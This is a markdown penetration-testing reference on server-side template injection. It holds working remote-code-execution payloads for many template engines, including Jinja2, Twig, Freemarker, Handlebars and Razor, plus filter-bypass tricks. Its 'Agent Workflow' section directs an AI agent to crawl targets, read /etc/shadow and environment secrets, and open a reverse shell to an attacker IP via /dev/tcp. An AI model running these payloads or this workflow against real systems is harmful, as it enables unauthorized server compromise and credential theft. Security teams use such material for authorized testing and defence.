# SSTI (Server-Side Template Injection)

> **Summary**: Injecting malicious template directives into server-side templates, causing the template engine to execute attacker-controlled code.
> **Impact**: Remote code execution, file read/write, full server compromise, information disclosure (secrets, config).
> **Typical Severity**: Critical

## Detection

### Indicators

- User input is reflected in rendered pages through a template engine
- Mathematical expressions are evaluated (e.g., `49` appears when submitting `{{7*7}}`)
- Error messages reveal template engine names (Jinja2, Twig, Freemarker, etc.)

### Automated Detection

```bash
# SSTImap - automated detection and exploitation
python3 sstimap.py -u "https://<TARGET>/page?name=John" -s

# TInjA - polyglot-based scanner
tinja url -u "https://<TARGET>/?name=test"

# Tplmap (legacy, Python 2)
python2.7 tplmap.py -u 'http://<TARGET>/page?name=John*'
```

### Manual Detection

#### Universal Fuzz String

Inject this polyglot into every input field and observe errors or unexpected output:

```
${{<%[%'"}}%\.
```

#### Decision Tree for Engine Identification

1. `{{7*7}}` -> `49`? If yes: Jinja2, Twig, or similar
2. `{{7*'7'}}` -> `7777777`? **Jinja2** (Python). If `49` -> **Twig** (PHP)
3. `${7*7}` -> `49`? **Freemarker**, **Velocity**, **Thymeleaf**, or **EL** (Java)
4. `<%= 7*7 %>` -> `49`? **ERB** (Ruby), **ASP**, or **Mojolicious** (Perl)
5. `#{7*7}` -> `49`? **Jade/Pug** (Node.js) or **Slim** (Ruby)
6. `{{7*7}}` -> Error? Check error message for engine name
7. `@(7*7)` -> `49`? **Razor** (.NET)

#### Blind SSTI Detection

- **Time-based**: Inject sleep/delay functions specific to the template engine
- **Out-of-band**: Use DNS/HTTP callbacks (e.g., `{{''.__class__.__mro__[1].__subclasses__()[X]('curl <COLLABORATOR>',shell=True)}}`)
- **Error-based**: Trigger distinct error messages (e.g., `{{7/0}}` for division by zero)

## Exploitation

### Prerequisites

- User input is rendered through a template engine without proper sanitization
- The template engine allows expression evaluation or code execution

### Step-by-Step

1. **Detect template injection** -- Submit the polyglot fuzz string and analyze the response
   - Success: Error messages, evaluated expressions, or missing characters
2. **Identify the template engine** -- Use the decision tree above
   - Success: Distinct behavior narrows it to a specific engine
3. **Read documentation** -- Understand the engine's built-in functions and security sandbox
4. **Explore the sandbox** -- Enumerate available objects, classes, and functions
5. **Escape the sandbox** -- Use MRO chains (Python), reflection (Java), or process access (Node.js)
6. **Achieve RCE** -- Execute OS commands through the identified escape chain

### Payloads (organized by engine)

---

#### Jinja2 (Python / Flask)

**Detection**:
```
{{7*'7'}} -> 7777777
{{config}}
{% debug %}
```

**Information Disclosure**:
```python
{{config.items()}}
{{settings.SECRET_KEY}}
{{request.environ}}
```

**RCE (MRO chain)**:
```python
{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id',shell=True,stdout=-1).communicate()[0] }}
```

**RCE (without guessing subclass index)**:
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

**RCE (via globals)**:
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**RCE (via config)**:
```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

---

#### Twig (PHP)

**Detection**:
```
{{7*7}} -> 49
{{7*'7'}} -> 49
```

**Information Disclosure**:
```php
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

**File Read**:
```php
{{'/etc/passwd'|file_excerpt(1,30)}}
```

**RCE**:
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}
```

---

#### Smarty (PHP)

**Detection**:
```
{$smarty.version}
```

**RCE**:
```php
{system('id')}
{system('cat /etc/passwd')}
```

---

#### Freemarker (Java)

**Detection**:
```
${7*7} -> 49
#{7*7} -> 49 (legacy)
```

**RCE**:
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Sandbox bypass (< 2.3.30)**:
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

#### Velocity (Java)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor())
#foreach($i in [1..$out.available()])$out.read()#end
```

---

#### Thymeleaf (Java / Spring)

**Detection**:
```
${7*7} -> 49
[[${7*7}]] -> 49 (expression inlining)
```

**RCE (SpringEL)**:
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**RCE (via preprocessing)**:
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

---

#### Pebble (Java)

**RCE (< 3.0.9)**:
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

---

#### ERB (Ruby)

**Detection**:
```
<%= 7*7 %> -> 49
```

**RCE**:
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= File.open('/etc/passwd').read %>
```

---

#### Slim (Ruby)

```ruby
{ %x|id| }
```

---

#### Handlebars (Node.js)

**RCE**:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

#### Jade / Pug (Node.js)

**Detection**:
```
#{7*7} -> 49
```

**RCE**:
```javascript
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

---

#### Nunjucks (Node.js)

**RCE**:
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

---

#### Mako (Python)

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

#### Tornado (Python)

```python
{% import os %}{{os.system('id')}}
```

---

#### Razor (.NET)

**Detection**: `@(2+2)` -> `4`

**RCE**:
```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

---

#### Django (Python)

**Detection**:
```
{% if 'str' == 'str' %} vuln {% endif %}
{% debug %}
```

**Information Disclosure**:
```
{% include 'admin/base.html' %}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

---

#### Go Templates

**Detection**:
```
{{ . }}
{{printf "%s" "ssti"}}
```

**RCE** (if object has exec method): `{{ .System "id" }}`

---

#### ASP / ASP.NET

**Detection**: `<%= 7*7 %>` -> `49`

**RCE**:
```asp
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>
```

### Proof of Concept

1. Submit `{{7*7}}` (or engine-appropriate syntax) in the target parameter
2. Verify `49` appears in the response
3. Escalate to `{{config}}` or equivalent to confirm sandbox access
4. Chain to OS command execution using the appropriate payload above

## Bypasses

- **Filter bypass (Jinja2)**: Use `|attr()` filter, hex encoding (`\x5f`), or `request` object to avoid blacklisted characters
- **Bypass `{{` blocking**: Use `{%` block syntax with `print()` or `include`
- **Bypass `_` blocking**: `request|attr(request.args.x)` with `?x=__class__`
- **Bypass `.` blocking**: `[]` notation or `|attr()` filter
- **WAF bypass**: Use [Fenjing](https://github.com/Marven11/Fenjing) for automated Jinja2 bypass generation
- **Bypass HTML encoding**: Use `|safe` filter in Jinja2/Flask

## Escalation

- SSTI -> RCE -> Full server compromise
- SSTI -> File read -> Source code / credential disclosure
- SSTI -> [XSS](xss.md) (if template output is rendered in browser without encoding)
- SSTI -> [LFI](lfi.md) (reading files via template functions)
- SSTI -> [Command Injection](command-injection.md) (executing OS commands)

## Tools

| Tool | Usage |
|------|-------|
| [SSTImap](https://github.com/vladko312/sstimap) | `sstimap.py -u "<URL>" -s` -- auto-detect and exploit |
| [TInjA](https://github.com/Hackmanit/TInjA) | `tinja url -u "<URL>"` -- polyglot-based SSTI+CSTI scanner |
| [Tplmap](https://github.com/epinna/tplmap) | `tplmap.py -u '<URL>'` -- legacy but supports many engines |
| [Template Injection Table](https://github.com/Hackmanit/template-injection-table) | Interactive reference for 44 template engines |
| [Fenjing](https://github.com/Marven11/Fenjing) | Automated Jinja2 WAF bypass / filter evasion |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery

1. **Identify potential template injection points**
   ```bash
   # Crawl the application for endpoints with parameters
   katana -u <TARGET_URL> -d 3 -jc -o katana_output.txt
   paramspider -d <TARGET_DOMAIN> --output paramspider_output.txt
   cat katana_output.txt paramspider_output.txt | uro | grep "=" | sort -u > params.txt
   ```
   - Focus on parameters that appear to be rendered in page output: `name=`, `template=`, `message=`, `greeting=`, `title=`, `content=`, `preview=`, path segments, and any user input reflected on the page.
   - Also check: error pages (custom 404), email templates, PDF generation inputs, profile fields, and search functionality.

2. **Inject polyglot fuzz string** into each parameter:
   ```
   ${{<%[%'"}}%\.
   ```
   - **Expected output**: Template engine error messages, missing characters, or evaluated expressions in the response.
   - **Decision**: If an error referencing a template engine appears (e.g., `jinja2.exceptions.TemplateSyntaxError`, `Twig_Error_Syntax`), SSTI is likely present. If the string is reflected without errors, the parameter may not be processed by a template engine.

3. **Test mathematical expression evaluation**:
   - Submit `{{7*7}}` -- look for `49` in the response.
   - Submit `${7*7}` -- look for `49` in the response.
   - Submit `<%= 7*7 %>` -- look for `49` in the response.
   - Submit `#{7*7}` -- look for `49` in the response.
   - Submit `@(7*7)` -- look for `49` in the response.
   - **Decision**: If `49` appears in the response for any syntax, template injection is confirmed. The syntax that worked identifies the engine family.

4. **Run automated SSTI scanners**:
   ```bash
   # SSTImap
   python3 sstimap.py -u "<TARGET_URL>?<PARAM>=test" -s

   # TInjA (polyglot-based)
   tinja url -u "<TARGET_URL>?<PARAM>=test"
   ```
   - **Expected output**: Scanner identifies the template engine and confirms injection.

### Phase 2: Validation

5. **Identify the specific template engine** using the decision tree:

   - **If `{{7*7}}` returned `49`**:
     - Submit `{{7*'7'}}`:
       - **If** result is `7777777` --> **Jinja2** (Python)
       - **If** result is `49` --> **Twig** (PHP)
       - **If** error --> check error message for engine name

   - **If `${7*7}` returned `49`**:
     - Submit `${class.getClass()}` or `${7*7}` with `#{7*7}`:
       - **If** `<#assign>` syntax works --> **Freemarker** (Java)
       - **If** SpringEL expressions work (`${T(java.lang.Runtime)}`) --> **Thymeleaf** (Java)
       - **If** `#set` syntax works --> **Velocity** (Java)

   - **If `<%= 7*7 %>` returned `49`**:
     - Submit `<%= system("id") %>`:
       - **If** command output returned --> **ERB** (Ruby)
       - **If** error --> ASP or Mojolicious

   - **If `#{7*7}` returned `49`**:
     - **Jade/Pug** (Node.js) or **Slim** (Ruby)

   - **If `@(7*7)` returned `49`**:
     - **Razor** (.NET)

6. **Confirm sandbox access and capabilities**:
   - **Jinja2**: Submit `{{config}}` or `{{config.items()}}` -- if configuration data returned, sandbox is weak.
   - **Twig**: Submit `{{_self.env}}` or `{{dump(app)}}`.
   - **Freemarker**: Submit `${"freemarker.template.utility.Execute"?new()("id")}`.
   - **ERB**: Submit `<%= File.open('/etc/passwd').read %>`.
   - **Decision**: If sensitive data (config, environment, file contents) is returned, the template engine has no effective sandbox -- proceed to RCE.

### Phase 3: Exploitation

7. **Achieve RCE with engine-specific payload**:

   - **Jinja2**:
     ```python
     # Via globals (most reliable)
     {{ cycler.__init__.__globals__.os.popen('id').read() }}

     # Via MRO chain (if globals are blocked)
     {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
     ```

   - **Twig**:
     ```php
     {{['id']|filter('system')}}
     {{['cat /etc/passwd']|filter('system')}}
     ```

   - **Freemarker**:
     ```java
     <#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
     ```

   - **Thymeleaf**:
     ```java
     __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
     ```

   - **ERB**:
     ```ruby
     <%= system("id") %>
     ```

   - **Handlebars**:
     Use the nested `{{#with}}` payload from the Payloads section above.

   - **Nunjucks**:
     ```javascript
     {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
     ```

   - **Razor**:
     ```csharp
     @System.Diagnostics.Process.Start("cmd.exe","/c whoami")
     ```

   - **Expected output**: Command output (e.g., `uid=33(www-data)...`) appears in the response.
   - **Decision**: If basic command execution works, proceed to Phase 4 for escalation. If payload is blocked, apply filter bypass techniques.

8. **If payload is blocked by filters**:
   - **Jinja2**: Use `|attr()` filter, hex encoding (`\x5f` for `_`), or `request` object to bypass character blacklists.
   - **Jinja2 WAF bypass**: Use [Fenjing](https://github.com/Marven11/Fenjing) for automated bypass generation.
   - **Twig**: Try `{{['id']|sort('system')}}` or `{{['id']|map('system')}}` alternatives.
   - Block `{{` bypass: Use `{%print(...)%}` or `{%include ...%}` syntax instead.

### Phase 4: Escalation

9. **Read sensitive files**:
   ```
   # Replace 'id' with file-read commands
   {{ cycler.__init__.__globals__.os.popen('cat /etc/shadow').read() }}
   {{ cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read() }}
   {{ cycler.__init__.__globals__.os.popen('cat /app/.env').read() }}
   ```
   - Look for: database credentials, API keys, secret keys, cloud credentials.

10. **Establish reverse shell**:
    ```
    # Jinja2 example
    {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"').read() }}
    ```
    - Set up listener: `nc -lvnp <PORT>`

11. **Chain with other vulnerabilities**:
    - SSTI --> RCE --> read `/proc/self/environ` for cloud credentials --> [AWS](../cloud/aws.md) / [Azure](../cloud/azure.md) escalation.
    - SSTI --> file read --> source code disclosure --> find additional vulnerabilities.
    - SSTI --> internal network access --> pivot to [SSRF](ssrf.md)-like scenarios.
    - SSTI --> [XSS](xss.md) if template output is rendered in browser without encoding.

## Decision Tree

```
START: Inject polyglot ${{<%[%'"}}%\. into parameter
  |
  +-- Error message or evaluated expression?
  |     |
  |     +-- YES --> Test {{7*7}}
  |     |            |
  |     |            +-- Returns 49?
  |     |            |     +-- YES --> Test {{7*'7'}}
  |     |            |     |            +-- Returns 7777777? --> JINJA2
  |     |            |     |            |     +-- Try {{ cycler.__init__.__globals__.os.popen('id').read() }}
  |     |            |     |            |     +-- Works? --> RCE CONFIRMED
  |     |            |     |            |     +-- Blocked? --> Use Fenjing / |attr() bypass
  |     |            |     |            |
  |     |            |     |            +-- Returns 49? --> TWIG
  |     |            |     |            |     +-- Try {{['id']|filter('system')}}
  |     |            |     |            |     +-- Works? --> RCE CONFIRMED
  |     |            |     |            |
  |     |            |     |            +-- Error? --> Check error for engine name
  |     |            |     |
  |     |            |     +-- NO --> Test ${7*7}
  |     |            |                  |
  |     |            |                  +-- Returns 49?
  |     |            |                  |     +-- YES --> Test Freemarker / Thymeleaf / Velocity
  |     |            |                  |     |     +-- <#assign> works? --> FREEMARKER
  |     |            |                  |     |     +-- SpringEL works? --> THYMELEAF
  |     |            |                  |     |     +-- #set works? --> VELOCITY
  |     |            |                  |     |
  |     |            |                  +-- NO --> Test <%= 7*7 %>
  |     |            |                            |
  |     |            |                            +-- Returns 49? --> ERB / ASP
  |     |            |                            |     +-- system("id") works? --> ERB (Ruby)
  |     |            |                            |     +-- CreateObject works? --> ASP (.NET)
  |     |            |                            |
  |     |            |                            +-- NO --> Test #{7*7}
  |     |            |                                      +-- Returns 49? --> JADE/PUG or SLIM
  |     |            |                                      +-- NO --> Test @(7*7)
  |     |            |                                                +-- Returns 49? --> RAZOR
  |     |            |                                                +-- NO --> SSTI not found
  |     |
  |     +-- NO --> Parameter not processed by template engine
  |           +-- Test other parameters
  |           +-- Test blind SSTI (time-based, OOB callbacks)
```

## Success Criteria

- **Confirmed SSTI**: Mathematical expression (e.g., `{{7*7}}`) evaluates to `49` in the response.
- **Engine identified**: The specific template engine is identified through the decision tree (Jinja2, Twig, Freemarker, etc.).
- **Information disclosed**: Configuration data, environment variables, or secret keys leaked through template objects (`config`, `_self.env`, etc.).
- **RCE achieved**: OS command output (e.g., `uid=33(www-data)...`) appears in the response.
- **Reverse shell obtained**: Interactive shell established from the target server to the attacker's listener.
- **Escalation confirmed**: Sensitive files read (credentials, keys), or pivot to internal network achieved.

---

## References

- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger Research - SSTI](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
- [Cobalt.io - SSTI Guide](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
- [SSTI Payloads](https://github.com/payloadbox/ssti-payloads)
- [Websites Vulnerable to SSTI (labs)](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
- [SecLists - Template Engine Special Vars](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

**See also**: [XSS](xss.md) | [Command Injection](command-injection.md) | [LFI](lfi.md)
